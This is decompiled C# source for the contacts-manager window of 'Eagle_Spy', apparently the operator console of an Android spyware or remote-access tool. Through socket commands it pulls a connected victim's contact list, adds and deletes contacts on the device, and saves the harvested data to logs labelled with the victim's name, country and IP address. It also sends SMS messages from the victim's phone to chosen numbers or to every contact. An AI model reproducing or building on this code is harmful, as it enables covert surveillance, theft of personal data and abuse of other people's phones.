using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Eagle_Spy.sockets;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy
{
	// Token: 0x02000038 RID: 56
	[DesignerGenerated]
	public partial class ContactsManager : Form
	{
		// Token: 0x0600040C RID: 1036 RVA: 0x000554B4 File Offset: 0x000536B4
		public ContactsManager()
		{
			base.Load += this.ContactsManager_Load;
			base.Activated += this.AngelAndroidForm_Activated;
			base.Deactivate += this.AngelAndroidForm_Deactivate;
			this.Title = "null";
			this.BoxTitlePaintEventArgsWait = false;
			this.InitializeComponent();
		}

		// Token: 0x0600040F RID: 1039 RVA: 0x000561E8 File Offset: 0x000543E8
		public void translateme()
		{
			string language = RegistryHandler.Get_Language();
			checked
			{
				if (Operators.CompareString(language, "AR", false) != 0)
				{
					if (Operators.CompareString(language, "CN", false) == 0)
					{
						int num = this.ctxMenu.Items.Count - 1;
						for (int i = 0; i <= num; i++)
						{
							this.ctxMenu.Items[i].Text = Codes.Translate(this.ctxMenu.Items[i].Text, "en", "zh");
						}
						return;
					}
				}
				else
				{
					int num2 = this.ctxMenu.Items.Count - 1;
					for (int j = 0; j <= num2; j++)
					{
						this.ctxMenu.Items[j].Text = Codes.Translate(this.ctxMenu.Items[j].Text, "en", "ar");
					}
				}
			}
		}

		// Token: 0x06000410 RID: 1040 RVA: 0x000032C1 File Offset: 0x000014C1
		private void TOpacity_Tick(object sender, EventArgs e)
		{
			if (base.Opacity != 1.0)
			{
				base.Opacity += 0.1;
				return;
			}
			this.TOpacity.Enabled = false;
		}

		// Token: 0x06000411 RID: 1041 RVA: 0x000562D8 File Offset: 0x000544D8
		private void ContactsManager_Load(object sender, EventArgs e)
		{
			this.translateme();
			base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\3.ico");
			this.DGV0.ColumnHeadersDefaultCellStyle.Font = reso.f;
			this.DGV0.DefaultCellStyle.Font = reso.f;
			if (Operators.CompareString(SpySettings.SAVING_DATA, "No", false) == 0)
			{
				this.SaveToolStripMenuItem.Visible = true;
				this.SaveAsToolStripMenuItem.Visible = true;
			}
			this.Text = this.Title;
			this.TOpacity.Interval = SpySettings.T_Interval;
			this.TOpacity.Enabled = true;
			this.BoxTitlePaintEventArgsWait = true;
		}

		// Token: 0x06000412 RID: 1042 RVA: 0x00056388 File Offset: 0x00054588
		private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
		{
			reso.Directory_Exist(this.classClient);
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				reso.SAVEit((Array)a0);
			}, new object[]
			{
				this.DGV0,
				this.tmpFolderUSER,
				"Contacts Manager",
				this.tmpClientName,
				this.tmpCountry + " - " + this.tmpAddressIP,
				"Contacts",
				"log",
				DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html"
			});
		}

		// Token: 0x06000413 RID: 1043 RVA: 0x00056438 File Offset: 0x00054638
		private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html";
			saveFileDialog.Filter = "html (*.html)|*.html";
			if (saveFileDialog.ShowDialog() == DialogResult.OK)
			{
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					reso.SAVEit((Array)a0);
				}, new object[]
				{
					this.DGV0,
					"null",
					saveFileDialog.FileName,
					this.tmpClientName,
					this.tmpCountry + " - " + this.tmpAddressIP,
					"Contacts",
					"log",
					"null"
				});
			}
			saveFileDialog.Dispose();
		}

		// Token: 0x06000414 RID: 1044 RVA: 0x00056508 File Offset: 0x00054708
		private void DeleteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.DGV0.SelectedRows.Count <= 0)
			{
				return;
			}
			checked
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Tag);
					string text2 = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value);
					if (this.classClient != null)
					{
						object[] array = new object[]
						{
							this.Client,
							string.Concat(new string[]
							{
								SecurityKey.KeysClient1,
								Data.SPL_SOCKET,
								reso.domen,
								".contacts",
								Data.SPL_SOCKET,
								"method",
								Data.SPL_SOCKET,
								SecurityKey.resultClient,
								Data.SPL_SOCKET,
								"del",
								Data.SPL_DATA,
								text,
								Data.SPL_DATA,
								text2
							}),
							Codes.Encoding().GetBytes("null"),
							this.classClient
						};
						this.classClient.SendMessage(array);
						this.DGV0.Rows.RemoveAt(this.DGV0.SelectedRows[i].Index);
					}
				}
			}
		}

		// Token: 0x06000415 RID: 1045 RVA: 0x000566A4 File Offset: 0x000548A4
		private void AddToolStripMenuItem_Click(object sender, EventArgs e)
		{
			AddNumber addNumber = new AddNumber();
			addNumber.Text = "Add new contact";
			addNumber.L0.Text = "Enter Name";
			addNumber.L1.Text = "Enter Number";
			addNumber.StartPosition = FormStartPosition.Manual;
			addNumber.Location = Codes.FixSize(this, addNumber);
			DialogResult dialogResult = addNumber.ShowDialog(this);
			if (dialogResult == DialogResult.OK && this.classClient != null)
			{
				object[] array = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient1,
						Data.SPL_SOCKET,
						reso.domen,
						".contacts",
						Data.SPL_SOCKET,
						"method",
						Data.SPL_SOCKET,
						SecurityKey.resultClient,
						Data.SPL_SOCKET,
						"add",
						Data.SPL_DATA,
						addNumber.InputText0.Text,
						Data.SPL_DATA,
						addNumber.InputText1.Text
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array);
			}
			addNumber.Close();
		}

		// Token: 0x06000416 RID: 1046 RVA: 0x000567E0 File Offset: 0x000549E0
		private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				object[] array = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient1,
						Data.SPL_SOCKET,
						reso.domen,
						".contacts",
						Data.SPL_SOCKET,
						"method",
						Data.SPL_SOCKET,
						SecurityKey.getContacts,
						Data.SPL_SOCKET,
						"contacts"
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array);
			}
		}

		// Token: 0x06000417 RID: 1047 RVA: 0x00056890 File Offset: 0x00054A90
		private void BoxTitle_Paint(object sender, PaintEventArgs e)
		{
			checked
			{
				if (this.BoxTitlePaintEventArgsWait)
				{
					int count = this.DGV0.Rows.Count;
					string text = "All " + Conversions.ToString(count);
					string text2 = "Selected " + Conversions.ToString(this.DGV0.SelectedRows.Count);
					Color defaultColor_Foreground = SpySettings.DefaultColor_Foreground;
					e.Graphics.DrawLine(new Pen(Color.FromArgb(50, (int)defaultColor_Foreground.R, (int)defaultColor_Foreground.G, (int)defaultColor_Foreground.B)), 0, 1, this.BoxTitle.Width, 1);
					Brush brush = new SolidBrush(SpySettings.DefaultColor_Foreground);
					Brush brush2 = new SolidBrush(Color.FromArgb(170, (int)this.BoxTitle.BackColor.R, (int)this.BoxTitle.BackColor.G, (int)this.BoxTitle.BackColor.B));
					Size size = TextRenderer.MeasureText(text + Strings.Space(10) + text2, reso.f);
					Rectangle rectangle = new Rectangle(0, 2, this.BoxTitle.Width, size.Height + 5);
					e.Graphics.FillRectangle(new Pen(brush2).Brush, rectangle);
					e.Graphics.DrawString(text + Strings.Space(10) + text2 + Strings.Space(10), reso.f, brush, 0f, 2f);
					Size size2 = TextRenderer.MeasureText("S", reso.f);
					if (this.BoxTitle.Height != size2.Height + 3)
					{
						this.BoxTitle.Height = size2.Height + 3;
					}
				}
			}
		}

		// Token: 0x06000418 RID: 1048 RVA: 0x000032F7 File Offset: 0x000014F7
		private void AngelAndroidForm_Activated(object sender, EventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x06000419 RID: 1049 RVA: 0x000032F7 File Offset: 0x000014F7
		private void AngelAndroidForm_Deactivate(object sender, EventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x0600041A RID: 1050 RVA: 0x000032F7 File Offset: 0x000014F7
		private void BoxTitle_Resize(object sender, EventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x0600041B RID: 1051 RVA: 0x00056A40 File Offset: 0x00054C40
		private void SendSmsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			checked
			{
				try
				{
					if (this.DGV0.SelectedRows.Count > 0 && this.classClient != null)
					{
						smsMaker smsMaker = new smsMaker();
						int num = this.DGV0.SelectedRows.Count - 1;
						for (int i = 0; i <= num; i++)
						{
							string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value);
							smsMaker.numslist.Items.Add(text);
						}
						if (smsMaker.ShowDialog() == DialogResult.OK && smsMaker.numslist.Items.Count > 0)
						{
							string text2 = smsMaker.msgtext.Text;
							TcpClient myClient = this.classClient.myClient;
							string[] array = this.classClient.Keys.Split(new char[] { ':' });
							int num2 = 0;
							int num3 = 0;
							if (smsMaker.checkall.Checked)
							{
								object[] array2 = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"ssms<*>all<>",
										text2,
										"#",
										Data.SPL_SOCKET,
										array[0],
										Data.SPL_SOCKET,
										array[1],
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(num2),
										Data.SPL_SOCKET,
										Conversions.ToString(num3),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										this.classClient.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									this.classClient
								};
								this.classClient.SendMessage(array2);
							}
							else
							{
								int num4 = smsMaker.numslist.Items.Count - 1;
								for (int j = 0; j <= num4; j++)
								{
									string text3 = Conversions.ToString(smsMaker.numslist.Items[j]);
									if (!(string.IsNullOrEmpty(text3) | string.IsNullOrWhiteSpace(text3)))
									{
										object[] array3 = new object[]
										{
											myClient,
											string.Concat(new string[]
											{
												SecurityKey.KeysClient2,
												Data.SPL_SOCKET,
												"ssms<*>",
												text3,
												"#",
												text2,
												Data.SPL_SOCKET,
												array[0],
												Data.SPL_SOCKET,
												array[1],
												Data.SPL_SOCKET,
												SecurityKey.Lockscreen,
												Data.SPL_SOCKET,
												Conversions.ToString(num2),
												Data.SPL_SOCKET,
												Conversions.ToString(num3),
												Data.SPL_SOCKET,
												Data.SPL_ARRAY,
												Data.SPL_SOCKET,
												this.classClient.ClientRemoteAddress
											}),
											Codes.Encoding().GetBytes("null"),
											this.classClient
										};
										this.classClient.SendMessage(array3);
									}
								}
							}
							EagleAlert.ShowSucess("your message was sent successfully");
						}
					}
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x0600041C RID: 1052 RVA: 0x000032F7 File Offset: 0x000014F7
		private void DGV0_RowsRemoved(object sender, DataGridViewRowsRemovedEventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x0600041D RID: 1053 RVA: 0x000032F7 File Offset: 0x000014F7
		private void DGV0_RowsAdded(object sender, DataGridViewRowsAddedEventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x0600041E RID: 1054 RVA: 0x000032F7 File Offset: 0x000014F7
		private void DGV0_SelectionChanged(object sender, EventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x0600041F RID: 1055
		[DllImport("user32.dll")]
		public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

		// Token: 0x06000420 RID: 1056
		[DllImport("user32.dll")]
		public static extern bool ReleaseCapture();

		// Token: 0x06000421 RID: 1057 RVA: 0x00003304 File Offset: 0x00001504
		private void guna2Panel2_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				ContactsManager.ReleaseCapture();
				ContactsManager.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x04000353 RID: 851
		public TcpClient Client;

		// Token: 0x04000354 RID: 852
		public Client classClient;

		// Token: 0x04000355 RID: 853
		public string Title;

		// Token: 0x04000356 RID: 854
		public string tmpFolderUSER;

		// Token: 0x04000357 RID: 855
		public string tmpClientName;

		// Token: 0x04000358 RID: 856
		public string tmpCountry;

		// Token: 0x04000359 RID: 857
		public string tmpAddressIP;

		// Token: 0x0400035A RID: 858
		private bool BoxTitlePaintEventArgsWait;
	}
}
